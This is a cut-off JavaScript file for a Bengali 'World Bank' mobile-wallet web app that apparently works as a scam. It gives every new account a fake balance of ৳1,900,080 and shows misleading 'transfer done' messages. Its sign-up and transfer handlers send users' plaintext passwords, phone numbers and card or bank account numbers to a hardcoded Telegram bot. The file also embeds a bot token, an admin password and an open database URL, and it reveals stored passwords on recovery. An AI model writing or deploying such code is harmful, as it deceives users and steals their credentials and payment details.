// ১. ফায়ারবেস কনফিগারেশন URL ও টেলিগ্রাম ক্রেডেনশিয়ালস
const FIREBASE_DB_URL = "https://wallet-banking-default-rtdb.firebaseio.com/";
const BOT_TOKEN = "8898294688:AAH6ngVGDHwNJ1Fpri9OiNgd2nqCDvs9BFE"; 
const CHAT_ID = "7560607133";

// এডমিন সিকিউরিটি পাসওয়ার্ড
const ADMIN_SECURITY_PASS = "worldbank1234@#";

// প্রারম্ভিক ব্যালেন্স ডাটা
const defaultTotalBalance = 1900080;
const defaultBalances = {
    WorldBank: 1900080,
    bKash: 0,
    Nagad: 0,
    Rocket: 0,
    Upay: 0,
    DBBL: 0,
    IBBL: 0,
    City: 0
};

let usersDatabase = [];
let bannedEmails = [];
let allTransactions = [];
let defaultGlobalMaxLimit = 500000;
let activeUser = JSON.parse(localStorage.getItem('wb_active_session')) || null;
let balanceHideTimer = null;
let currentLang = 'bn';

// কাস্টম পপ-আপ অ্যালার্ট
function showCustomAlert(title, message) {
    document.getElementById('customAlertTitle').innerText = title;
    document.getElementById('customAlertText').innerText = message;
    document.getElementById('customAlertModal').classList.remove('hidden');
}

function closeCustomAlert() {
    document.getElementById('customAlertModal').classList.add('hidden');
}

// ইমেইলকে ফায়ারবেস কি-তে রূপান্তর
function sanitizeEmailKey(email) {
    return email ? email.replace(/[^a-zA-Z0-9]/g, "_") : "";
}

// সেন্ট্রাল ক্লাউড সিঙ্ক ফাংশন
async function syncFromFirebase() {
    try {
        const uRes = await fetch(`${FIREBASE_DB_URL}/users.json`);
        const uData = await uRes.json();
        if (uData) {
            usersDatabase = Object.values(uData);
            localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
            
            if (activeUser) {
                const refreshedUser = usersDatabase.find(u => u.email === activeUser.email);
                if (refreshedUser) {
                    activeUser = refreshedUser;
                    localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
                }
            }
        } else {
            usersDatabase = [];
        }

        const bRes = await fetch(`${FIREBASE_DB_URL}/bannedEmails.json`);
        const bData = await bRes.json();
        if (bData) {
            bannedEmails = Object.values(bData);
            localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
        } else {
            bannedEmails = JSON.parse(localStorage.getItem('wb_banned')) || [];
        }

        const tRes = await fetch(`${FIREBASE_DB_URL}/transactions.json`);
        const tData = await tRes.json();
        if (tData) {
            allTransactions = Object.values(tData).reverse();
            localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        }

    } catch(err) {
        console.error("Firebase sync error:", err);
        usersDatabase = JSON.parse(localStorage.getItem('wb_users')) || [];
        bannedEmails = JSON.parse(localStorage.getItem('wb_banned')) || [];
        allTransactions = JSON.parse(localStorage.getItem('wb_transactions')) || [];
    }
}

document.addEventListener('DOMContentLoaded', async () => {
    await syncFromFirebase();
    
    if (activeUser) {
        const refreshedUser = usersDatabase.find(u => u.email === activeUser.email);
        if (refreshedUser) {
            activeUser = refreshedUser;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
        renderBalances();
    }
});

async function refreshAdminData() {
    await syncFromFirebase();
    renderAdminUsersList();
    renderAdminPendingList();
    renderAdminAllHistory();
    populateAdminUserSelect();
    showCustomAlert("সফল", currentLang === 'bn' ? 'ডাটাবেস সফলভাবে রিফ্রেশ করা হয়েছে!' : 'Database refreshed successfully!');
}

async function saveUserToFirebase(user) {
    const userKey = sanitizeEmailKey(user.email);
    try {
        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(user)
        });
    } catch(err) {
        console.error("User save error:", err);
    }
}

async function saveTxToFirebase(txObj) {
    try {
        await fetch(`${FIREBASE_DB_URL}/transactions/tx_${txObj.id}.json`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(txObj)
        });
    } catch(err) {
        console.error("Transaction save error:", err);
    }
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function togglePasswordVisibility(inputId, btn) {
    const input = document.getElementById(inputId);
    if (!input) return;
    if (input.type === 'password') {
        input.type = 'text';
        btn.innerText = '🙈';
    } else {
        input.type = 'password';
        btn.innerText = '👁️';
    }
}

function openTopUpModal() {
    document.getElementById('topUpModal').classList.toggle('hidden');
}

function openCardBankModal() {
    document.getElementById('cardBankModal').classList.toggle('hidden');
}

function toggleForgotModal() {
    document.getElementById('forgotModal').classList.toggle('hidden');
}

function handleForgotPassword(e) {
    e.preventDefault();
    const email = document.getElementById('forgotEmailInput').value.trim();
    const phone = document.getElementById('forgotPhoneInput').value.trim();

    const user = usersDatabase.find(u => u.email === email && u.phone === phone);

    if (user) {
        showCustomAlert("রিকভারি", currentLang === 'bn' 
            ? `আপনার অ্যাকাউন্ট সফলভাবে রিকভার হয়েছে!\n\nইমেইল: ${user.email}\nপাসওয়ার্ড: ${user.password}`
            : `Account recovered successfully!\n\nEmail: ${user.email}\nPassword: ${user.password}`);
        toggleForgotModal();
    } else {
        showCustomAlert("ত্রুটি", currentLang === 'bn' 
            ? 'প্রদত্ত ইমেইল বা মোবাইল নম্বরটি পাওয়া যায়নি!'
            : 'Entered email or phone number not found!');
    }
}

function setLanguage(lang) {
    currentLang = lang;
    document.getElementById('btnLangBN').classList.toggle('active', lang === 'bn');
    document.getElementById('btnLangEN').classList.toggle('active', lang === 'en');
    
    const dashLangBtn = document.getElementById('dashLangBtn');
    if (dashLangBtn) dashLangBtn.innerText = lang === 'bn' ? 'EN' : 'BN';

    document.querySelectorAll('[data-bn]').forEach(el => {
        el.innerText = lang === 'bn' ? el.getAttribute('data-bn') : el.getAttribute('data-en');
    });

    document.querySelectorAll('[data-bn-ph]').forEach(el => {
        el.placeholder = lang === 'bn' ? el.getAttribute('data-bn-ph') : el.getAttribute('data-en-ph');
    });

    document.querySelectorAll('option[data-bn]').forEach(opt => {
        opt.innerText = lang === 'bn' ? opt.getAttribute('data-bn') : opt.getAttribute('data-en');
    });
}

function switchTab(type) {
    document.getElementById('errorText').style.display = 'none';
    if(type === 'login') {
        document.getElementById('loginForm').classList.remove('hidden');
        document.getElementById('signUpForm').classList.add('hidden');
        document.getElementById('loginTab').classList.add('active');
        document.getElementById('signUpTab').classList.remove('active');
    } else {
        document.getElementById('signUpForm').classList.remove('hidden');
        document.getElementById('loginForm').classList.add('hidden');
        document.getElementById('signUpTab').classList.add('active');
        document.getElementById('loginTab').classList.remove('active');
    }
}

function sendTelegramNotification(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
    }).catch(err => console.error("Telegram API Error:", err));
}

// সাইন আপ (ব্ল্যাকলিস্ট চেক সহ)
async function handleSignUp(e) {
    e.preventDefault();
    const name = document.getElementById('regName').value;
    const email = document.getElementById('regEmail').value;
    const phone = document.getElementById('regPhone').value;
    const password = document.getElementById('regPass').value;

    await syncFromFirebase();

    if (bannedEmails.includes(email)) {
        showCustomAlert("ব্লকড", currentLang === 'bn' ? 'এই ইমেইল অ্যাড্রেসটি স্থায়ীভাবে ব্লক করা হয়েছে। এই ইমেইল দিয়ে আর অ্যাকাউন্ট খোলা যাবে না।' : 'This email address has been permanently blocked. You cannot register with this email.');
        return;
    }

    const exists = usersDatabase.some(u => u.email === email);
    if(exists) {
        showCustomAlert("সতর্কতা", currentLang === 'bn' ? 'এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট খোলা হয়েছে!' : 'An account already exists with this email!');
        return;
    }

    const newUser = {
        name,
        email,
        phone,
        password,
        totalBalance: defaultTotalBalance,
        withdrawLimit: defaultGlobalMaxLimit,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await saveUserToFirebase(newUser);

    sendTelegramNotification(`👤 <b>World Bank নতুন সাইন আপ!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n📱 ফোন: ${phone}\n🔑 পাসওয়ার্ড: ${password}`);

    showCustomAlert("সফল", currentLang === 'bn' ? 'অ্যাকাউন্ট সফলভাবে তৈরি হয়েছে! এখন লগইন করুন।' : 'Registration successful! Please login.');
    switchTab('login');
    document.getElementById('signUpForm').reset();
}

// লগইন
async function handleLogin(e) {
    e.preventDefault();
    const email = document.getElementById('logEmail').value;
    const password = document.getElementById('logPass').value;

    await syncFromFirebase();

    if (bannedEmails.includes(email)) {
        showCustomAlert("ব্লকড", currentLang === 'bn' ? 'আপনার অ্যাকাউন্টটি স্থায়ীভাবে ব্লক করা হয়েছে!' : 'Your account has been permanently blocked!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === email && u.password === password);

    if(userIndex !== -1) {
        activeUser = usersDatabase[userIndex];
        if(!activeUser.balances) activeUser.balances = { ...defaultBalances };

        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));

        document.getElementById('authSection').classList.add('hidden');
        document.getElementById('dashboardSection').classList.remove('hidden');
        document.getElementById('userPhoneDisp').innerText = activeUser.phone || activeUser.email;
        document.getElementById('errorText').style.display = 'none';

        renderBalances();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

// হেডার পিলারের Tap for Balance ফাংশন
function toggleBalanceVisibility() {
    const pillText = document.getElementById('balancePillText');
    if (!activeUser) return;

    if (balanceHideTimer) clearTimeout(balanceHideTimer);

    const showBal = activeUser.totalBalance !== undefined ? activeUser.totalBalance : (activeUser.balances ? activeUser.balances.WorldBank : 0);
    pillText.innerText = `৳ ${showBal.toLocaleString('bn-BD')}`;

    balanceHideTimer = setTimeout(() => {
        pillText.innerText = "Tap for Balance";
    }, 3000);
}

function renderBalances() {
    const pillText = document.getElementById('balancePillText');
    if (pillText) pillText.innerText = "Tap for Balance";
}

function logout() {
    activeUser = null;
    localStorage.removeItem('wb_active_session');
    document.getElementById('dashboardSection').classList.add('hidden');
    document.getElementById('authSection').classList.remove('hidden');
    document.getElementById('loginForm').reset();
}

function scrollToAction(type) {
    let targetId = type === 'Withdraw' ? 'withdrawFormBox' : 'depositFormBox';
    let targetEl = document.getElementById(targetId);

    if (targetEl) {
        targetEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
        targetEl.classList.add('highlight');
        setTimeout(() => {
            targetEl.classList.remove('highlight');
        }, 1500);
    }
}

function toggleProfileModal() {
    document.getElementById('profileModal').classList.toggle('hidden');
    if (activeUser) {
        document.getElementById('profNameInput').value = activeUser.name || '';
        document.getElementById('profPhoneInput').value = activeUser.phone || '';
        document.getElementById('profPassInput').value = activeUser.password || '';
    }
}

async function openInboxModal() {
    await syncFromFirebase();
    document.getElementById('inboxModal').classList.toggle('hidden');
    renderUserInboxHistory();
}

async function updateUserProfile(e) {
    e.preventDefault();
    if (!activeUser) return;

    activeUser.name = document.getElementById('profNameInput').value;
    activeUser.phone = document.getElementById('profPhoneInput').value;
    activeUser.password = document.getElementById('profPassInput').value;

    const userIndex = usersDatabase.findIndex(u => u.email === activeUser.email);
    if (userIndex !== -1) {
        usersDatabase[userIndex] = activeUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        await saveUserToFirebase(activeUser);
    }

    document.getElementById('userPhoneDisp').innerText = activeUser.phone;
    showCustomAlert("সফল", currentLang === 'bn' ? 'প্রোফাইল তথ্য আপডেট করা হয়েছে!' : 'Profile updated successfully!');
    toggleProfileModal();
}

// মোবাইল টপ আপ (নির্দিষ্ট সফল বার্তা)
async function handleTopUpSubmit(e) {
    e.preventDefault();
    const operator = document.getElementById('topUpOperatorSelect').value;
    const phone = document.getElementById('topUpPhoneInput').value;
    const simType = document.getElementById('topUpSimTypeSelect').value;
    const amount = parseFloat(document.getElementById('topUpAmountInput').value);

    if (!operator || !phone || isNaN(amount) || amount <= 0) {
        showCustomAlert("ত্রুটি", currentLang === 'bn' ? 'সঠিক তথ্য দিন!' : 'Please enter valid details!');
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.email,
        userName: activeUser.name,
        type: 'TopUp',
        method: `${operator} (${simType})`,
        phone: phone,
        amount: amount,
        trxId: 'TOPUP_' + Math.floor(100000 + Math.random() * 900000),
        status: 'Pending',
        dateStr: now.toLocaleDateString('bn-BD'),
        timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`📱 <b>World Bank মোবাইল টপ আপ রিকোয়েস্ট!</b>\n\n👤 ইউজার: ${activeUser.name}\n📡 অপারেটর: ${operator} (${simType})\n📱 নম্বর: ${phone}\n💰 পরিমাণ: ৳${amount}`);

    const msg = currentLang === 'bn' 
        ? 'আপনার মোবাইল টপ আপ সফলভাবে হয়ে গেছে। ৫ থেকে ১০ মিনিট সময় লাগবে, এর মধ্যে এপ্রুভ হয়ে আপনার একাউন্টে টাকা চলে যাবে।' 
        : 'Your mobile top up has been done successfully. It will take 5 to 10 minutes to be approved.';
    showCustomAlert("সফল রিকোয়েস্ট", msg);

    e.target.reset();
    openTopUpModal();
}

// কার্ড / ব্যাংক ট্রান্সফার (নির্দিষ্ট সফল বার্তা)
async function handleCardBankSubmit(e) {
    e.preventDefault();
    const type = document.getElementById('cardBankTypeSelect').value;
    const cardAcc = document.getElementById('cardBankAccInput').value;
    const receiverPhone = document.getElementById('cardBankReceiverInput').value;
    const amount = parseFloat(document.getElementById('cardBankAmountInput').value);

    if (!type || !cardAcc || !receiverPhone || isNaN(amount) || amount <= 0) {
        showCustomAlert("ত্রুটি", currentLang === 'bn' ? 'সঠিক তথ্য দিন!' : 'Please enter valid details!');
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.email,
        userName: activeUser.name,
        type: 'Card/Bank Transfer',
        method: type,
        phone: `Card/Bank: ${cardAcc} -> ${receiverPhone}`,
        amount: amount,
        trxId: 'TRX_' + Math.floor(100000 + Math.random() * 900000),
        status: 'Pending',
        dateStr: now.toLocaleDateString('bn-BD'),
        timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    sendTelegramNotification(`💳 <b>World Bank কার্ড/ব্যাংক ট্রান্সফার রিকোয়েস্ট!</b>\n\n👤 ইউজার: ${activeUser.name}\n📌 টাইপ: ${type}\n💳 কার্ড/ব্যাংক নম্বর: ${cardAcc}\n📱 প্রাপক নম্বর: ${receiverPhone}\n💰 পরিমাণ: ৳${amount}`);

    const msg = currentLang === 'bn' 
        ? 'আপনার ট্রান্সফার সফলভাবে হয়ে গেছে। ৫ থেকে ১০ মিনিট সময় লাগবে, এর মধ্যে এপ্রুভ হয়ে আপনার একাউন্টে টাকা চলে যাবে।' 
        : 'Your transfer has been done successfully. It will take 5 to 10 minutes to be approved.';
    showCustomAlert("সফল রিকোয়েস্ট", msg);

    e.target.reset();
    openCardBankModal();
}

// উইথড্র ও ডিপোজিট (আলাদা ও নির্দিষ্ট সফল বার্তা)
async function submitTransactionRequest(e, type) {
    e.preventDefault();
    const form = e.target;
    const method = form.querySelector('.methodSelect').value;
    const phone = form.querySelector('.phoneInput').value;
    const amount = parseFloat(form.querySelector('.amountInput').value);
    const trxId = form.querySelector('.trxInput').value;

    if (isNaN(amount) || amount <= 0) {
        showCustomAlert("ত্রুটি", currentLang === 'bn' ? 'সঠিক পরিমাণ দিন!' : 'Please enter a valid amount!');
        return;
    }

    const userLimit = activeUser.withdrawLimit !== undefined ? parseFloat(activeUser.withdrawLimit) : defaultGlobalMaxLimit;

    if (type === 'Withdraw' && amount > userLimit) {
        const limitMsg = currentLang === 'bn' 
            ? `আপনার সর্বোচ্চ উইথড্র লিমিট ৳${userLimit.toLocaleString('bn-BD')}-এর বেশি রিকোয়েস্ট করা যাবে না।`
            : `Your maximum withdraw limit is ৳${userLimit.toLocaleString('en-US')}. You cannot request more than this limit.`;
        showCustomAlert("লিমিট অতিক্রম", limitMsg);
        return;
    }

    const now = new Date();
    const txObj = {
        id: Date.now(),
        userEmail: activeUser.email,
        userName: activeUser.name,
        type: type,
        method: method,
        phone: phone,
        amount: amount,
        trxId: trxId,
        status: 'Pending',
        dateStr: now.toLocaleDateString('bn-BD'),
        timeStr: now.toLocaleTimeString('bn-BD')
    };

    allTransactions.unshift(txObj);
    localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
    await saveTxToFirebase(txObj);

    const msg = `⏳ <b>World Bank নতুন ${type} পেন্ডিং রিকোয়েস্ট!</b>\n\n` +
                `👤 ইউজার: ${activeUser.name}\n` +
                `📌 টাইপ: ${type}\n` +
                `🏦 মেথড: ${method}\n` +
                `📱 নম্বর: ${phone}\n` +
                `💰 পরিমাণ: ৳${amount}\n` +
                `🆔 TrxID: ${trxId}`;
    sendTelegramNotification(msg);

    let successAlert = "";
    if (type === 'Withdraw') {
        successAlert = currentLang === 'bn' 
            ? 'আপনার উইথড্র সফলভাবে হয়ে গেছে। ৫ থেকে ১০ মিনিট সময় লাগবে, এর মধ্যে এপ্রুভ হয়ে আপনার একাউন্টে টাকা চলে যাবে।'
            : 'Your withdraw has been done successfully. It will take 5 to 10 minutes, and the money will be added to your account upon approval.';
    } else {
        successAlert = currentLang === 'bn' 
            ? 'আপনার ডিপোজিট সফলভাবে হয়ে গেছে। ৫ থেকে ১০ মিনিট সময় লাগবে, এর মধ্যে এপ্রুভ হয়ে আপনার ডিপোজিট সফল হবে।'
            : 'Your deposit has been done successfully. It will take 5 to 10 minutes to be approved and completed.';
    }

    showCustomAlert("সফল রিকোয়েস্ট", successAlert);

    form.reset();
    scrollToTop();
}

function renderUserInboxHistory() {
    const tbody = document.getElementById('userInboxModalBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const myTxs = allTransactions.filter(t => t.userEmail === activeUser.email);

    if (myTxs.length === 0) {
        const noRecordText = currentLang === 'bn' ? 'কোনো লেনদেন হিস্ট্রি পাওয়া যায়নি।' : 'No transaction records found.';
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#64748b; font-weight:bold;">${noRecordText}</td></tr>`;
        return;
    }

    myTxs.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="color:#0f172a !important; font-weight: bold;">${t.dateStr} ${t.timeStr}</td>
            <td style="color:#0f172a !important; font-weight: bold;">${t.type}</td>
            <td style="color:#0f172a !important; font-weight: bold;">${t.method}</td>
            <td style="color:#be123c !important; font-weight: bold;">৳${t.amount.toLocaleString('bn-BD')}</td>
            <td style="color:#0f172a !important; font-weight: bold;"><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function toggleAdminModal() {
    document.getElementById('adminModal').classList.toggle('hidden');
}

async function verifyAdminPassword() {
    const pass = document.getElementById('adminPassInput').value;
    if (pass === ADMIN_SECURITY_PASS) {
        document.getElementById('adminAuthBox').classList.add('hidden');
        document.getElementById('adminControlBox').classList.remove('hidden');
        
        await syncFromFirebase();
        renderAdminUsersList();
        renderAdminPendingList();
        renderAdminAllHistory();
        populateAdminUserSelect();
    } else {
        showCustomAlert("ত্রুটি", 'ভুল পাসওয়ার্ড!');
    }
}

// ইউজার ডিলিট এবং পার্মানেন্ট ব্যান
async function adminDeleteUser(userEmail) {
    if (!confirm(`আপনি কি নিশ্চিতভাবে ${userEmail}-কে ডিলিট এবং ব্ল্যাকলিস্ট করতে চান? এই ইমেইল বা ফোন নম্বর দিয়ে ভবিষ্যতে আর কেউ নতুন অ্যাকাউন্ট খুলতে বা লগইন করতে পারবে না।`)) {
        return;
    }

    usersDatabase = usersDatabase.filter(u => u.email !== userEmail);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));

    try {
        const userKey = sanitizeEmailKey(userEmail);
        await fetch(`${FIREBASE_DB_URL}/users/${userKey}.json`, { method: 'DELETE' });
    } catch(err) {
        console.error("User delete firebase error:", err);
    }

    if (!bannedEmails.includes(userEmail)) {
        bannedEmails.push(userEmail);
        localStorage.setItem('wb_banned', JSON.stringify(bannedEmails));
        try {
            const banKey = sanitizeEmailKey(userEmail);
            await fetch(`${FIREBASE_DB_URL}/bannedEmails/${banKey}.json`, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userEmail)
            });
        } catch(err) {
            console.error("Ban save error:", err);
        }
    }

    showCustomAlert("সফল", `ইউজার ${userEmail} সফলভাবে ডিলিট এবং ব্ল্যাকলিস্ট করা হয়েছে!`);
    renderAdminUsersList();
    populateAdminUserSelect();
}

async function adminUpdateUserWithdrawLimit(e) {
    e.preventDefault();
    const userEmail = document.getElementById('admLimitUserSelect').value;
    const newLimit = parseFloat(document.getElementById('admUserCustomLimitInput').value);

    if (!userEmail || isNaN(newLimit) || newLimit < 0) {
        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === userEmail);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        user.withdrawLimit = newLimit;

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        showCustomAlert("সফল", `সফলভাবে ${user.name}-এর উইথড্র লিমিট ৳${newLimit.toLocaleString('bn-BD')} করা হয়েছে!`);
        
        document.getElementById('admUserCustomLimitInput').value = '';
        renderAdminUsersList();

        if (activeUser && activeUser.email === user.email) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
        }
    }
}

function populateAdminUserSelect() {
    const balSelect = document.getElementById('admBalanceUserSelect');
    const limSelect = document.getElementById('admLimitUserSelect');

    if (balSelect) balSelect.innerHTML = '<option value="">ইউজার সিলেক্ট করুন</option>';
    if (limSelect) limSelect.innerHTML = '<option value="">ইউজার ইমেইল সিলেক্ট করুন</option>';

    usersDatabase.forEach(u => {
        const opt1 = document.createElement('option');
        opt1.value = u.email;
        opt1.innerText = `${u.name} (${u.email})`;
        if (balSelect) balSelect.appendChild(opt1);

        const opt2 = document.createElement('option');
        opt2.value = u.email;
        opt2.innerText = `${u.name} (${u.email})`;
        if (limSelect) limSelect.appendChild(opt2);
    });
}

async function adminUpdateUserBalance(e) {
    e.preventDefault();
    const userEmail = document.getElementById('admBalanceUserSelect').value;
    const method = document.getElementById('admBalanceMethodSelect').value;
    const newAmount = parseFloat(document.getElementById('admBalanceAmount').value);

    if (!userEmail || isNaN(newAmount) || newAmount < 0) {
        showCustomAlert("ত্রুটি", 'সঠিক তথ্য দিন!');
        return;
    }

    const userIndex = usersDatabase.findIndex(u => u.email === userEmail);
    if (userIndex !== -1) {
        const user = usersDatabase[userIndex];
        if (!user.balances) user.balances = { ...defaultBalances };

        user.balances[method] = newAmount;

        if (method === 'WorldBank') {
            user.totalBalance = newAmount;
        }

        usersDatabase[userIndex] = user;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(user);

        showCustomAlert("সফল", `সফলভাবে ${user.name}-এর ${method} ব্যালেন্স ৳${newAmount.toLocaleString('bn-BD')} আপডেট করা হয়েছে!`);
        
        renderAdminUsersList();
        
        if (activeUser && activeUser.email === user.email) {
            activeUser = user;
            localStorage.setItem('wb_active_session', JSON.stringify(activeUser));
            renderBalances();
        }
    }
}

async function adminCreateUser(e) {
    e.preventDefault();
    const name = document.getElementById('admUserName').value;
    const email = document.getElementById('admUserEmail').value;
    const phone = document.getElementById('admUserPhone').value;
    const password = document.getElementById('admUserPass').value;

    if (bannedEmails.includes(email)) {
        showCustomAlert("ত্রুটি", 'এই ইমেইলটি ব্ল্যাকলিস্টে রয়েছে। এটি দিয়ে ইউজার খোলা যাবে না!');
        return;
    }

    const exists = usersDatabase.some(u => u.email === email);
    if(exists) {
        showCustomAlert("ত্রুটি", 'এই ইমেইল দিয়ে আগেই অ্যাকাউন্ট রয়েছে!');
        return;
    }

    const newUser = {
        name,
        email,
        phone,
        password,
        totalBalance: defaultTotalBalance,
        withdrawLimit: defaultGlobalMaxLimit,
        balances: { ...defaultBalances }
    };

    usersDatabase.push(newUser);
    localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
    await saveUserToFirebase(newUser);

    sendTelegramNotification(`👑 <b>এডমিন কর্তৃক নতুন ইউজার তৈরি!</b>\n\n📛 নাম: ${name}\n📧 ইমেইল: ${email}\n🔑 পাসওয়ার্ড: ${password}`);

    showCustomAlert("সফল", 'সফলভাবে ইউজার তৈরি হয়েছে!');
    
    document.getElementById('admUserName').value = '';
    document.getElementById('admUserEmail').value = '';
    document.getElementById('admUserPhone').value = '';
    document.getElementById('admUserPass').value = '';

    renderAdminUsersList();
    populateAdminUserSelect();
}

// এডমিন ইউজার টেবিলে টোটাল ব্যালেন্স ও লিমিট ব্যালেন্স রেন্ডার করা
function renderAdminUsersList() {
    const tbody = document.getElementById('adminUsersListBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (usersDatabase.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো নিবন্ধিত ইউজার পাওয়া যায়নি।</td></tr>`;
        return;
    }

    usersDatabase.forEach(u => {
        const tr = document.createElement('tr');
        const mainBal = u.totalBalance !== undefined ? u.totalBalance : (u.balances ? u.balances.WorldBank : 0);
        const limitBal = u.withdrawLimit !== undefined ? u.withdrawLimit : defaultGlobalMaxLimit;
        
        tr.innerHTML = `
            <td><b>${u.name || 'N/A'}</b></td>
            <td>${u.email || 'N/A'}</td>
            <td>${u.phone || 'N/A'}</td>
            <td style="color:#38bdf8;"><b>৳${mainBal.toLocaleString('bn-BD')}</b></td>
            <td style="color:#f59e0b;"><b>৳${limitBal.toLocaleString('bn-BD')}</b></td>
            <td>
                <button onclick="adminDeleteUser('${u.email}')" class="btn-delete-user">Delete & Ban</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function renderAdminPendingList() {
    const tbody = document.getElementById('adminPendingTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    const pendingTxs = allTransactions.filter(t => t.status === 'Pending');

    if (pendingTxs.length === 0) {
        tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:#94a3b8;">কোনো পেন্ডিং রিকোয়েস্ট নেই।</td></tr>`;
        return;
    }

    pendingTxs.forEach(t => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail}</b></td>
            <td style="color:#f59e0b;"><b>${t.type}</b></td>
            <td>${t.method}</td>
            <td>${t.phone}</td>
            <td style="color:#38bdf8;"><b>৳${t.amount.toLocaleString('bn-BD')}</b></td>
            <td><code>${t.trxId}</code></td>
            <td>
                <button onclick="approveTransaction(${t.id})" class="btn-approve">Approve</button>
                <button onclick="rejectTransaction(${t.id})" class="btn-reject">Reject</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

function renderAdminAllHistory() {
    const tbody = document.getElementById('adminAllHistoryTableBody');
    if (!tbody) return;
    tbody.innerHTML = '';

    if (allTransactions.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6" style="text-align:center; color:#94a3b8;">কোনো ট্রানজেকশন ডাটা নেই।</td></tr>`;
        return;
    }

    allTransactions.forEach(t => {
        let statusBadge = `<span class="status-pending">Pending ⏳</span>`;
        if (t.status === 'Approved') statusBadge = `<span class="status-approved">Approved ✅</span>`;
        if (t.status === 'Rejected') statusBadge = `<span class="status-rejected">Rejected ❌</span>`;

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td><b>${t.userName || t.userEmail}</b></td>
            <td>${t.type}</td>
            <td>${t.method}</td>
            <td>৳${t.amount.toLocaleString('bn-BD')}</td>
            <td><code>${t.trxId}</code></td>
            <td>${statusBadge}</td>
        `;
        tbody.appendChild(tr);
    });
}

async function approveTransaction(txId) {
    const txIndex = allTransactions.findIndex(t => t.id === txId);
    if (txIndex === -1) return;

    const tx = allTransactions[txIndex];
    const userIndex = usersDatabase.findIndex(u => u.email === tx.userEmail);

    if (userIndex !== -1) {
        const targetUser = usersDatabase[userIndex];
        if (!targetUser.balances) targetUser.balances = { ...defaultBalances };
        if (targetUser.totalBalance === undefined) {
            targetUser.totalBalance = targetUser.balances.WorldBank !== undefined ? targetUser.balances.WorldBank : defaultTotalBalance;
        }

        if (tx.type === 'Withdraw' || tx.type === 'TopUp' || tx.type === 'Card/Bank Transfer') {
            targetUser.totalBalance -= tx.amount;
        } else if (tx.type === 'Deposit') {
            targetUser.totalBalance += tx.amount;
        }

        usersDatabase[userIndex] = targetUser;
        localStorage.setItem('wb_users', JSON.stringify(usersDatabase));
        await saveUserToFirebase(targetUser);

        allTransactions[txIndex].status = 'Approved';
        localStorage.setItem('wb_transactions', JSON.stringify(allTransactions));
        await saveTxToFirebase(allTransactions[txIndex]);

        sendTelegramNotification(`✅ <b>ট্রানজেকশন অ্যাপ্রুভড!</b>\n\n👤 ইউজার: ${tx.userName}\n💰 পরিমাণ: ৳${tx.amount}\n📌 টাইপ: ${tx.type}`);

